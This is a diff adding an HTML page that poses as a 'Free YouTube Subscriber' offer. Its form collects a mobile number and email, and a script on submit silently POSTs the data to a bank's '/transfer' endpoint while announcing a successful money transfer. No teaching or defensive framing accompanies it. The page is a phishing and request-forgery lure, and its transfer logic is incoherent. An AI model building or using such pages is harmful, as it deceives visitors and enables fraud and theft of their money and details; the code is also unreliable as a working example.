@@ -1,0 +1,32 @@
+<html>
+<head>
+<title>Free YouTube Subscriber</title>
+</head>
+<body>
+<h1>Log into your account</h1>
+<form action="https://victimbank.com/login" method="POST">
+<input type="text" name="mobile" placeholder="Mobile Number">
+<input type="email" name="email" placeholder="Email">
+<input type="submit" value="Get OTP">
+</form>
+
+<script>
+document.querySelector('form').addEventListener('submit', function(e) {
+e.preventDefault();
+
+var formData = new FormData(document.querySelector('form'));
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://victimbank.com/transfer', true);
+xhr.onload = function() {
+if (xhr.status === 200) {
+alert('Money transferred successfully.');
+} else {
+alert('Transfer failed.');
+}
+};
+xhr.send(formData);
+});
+</script>
+
+</body>
+</html>
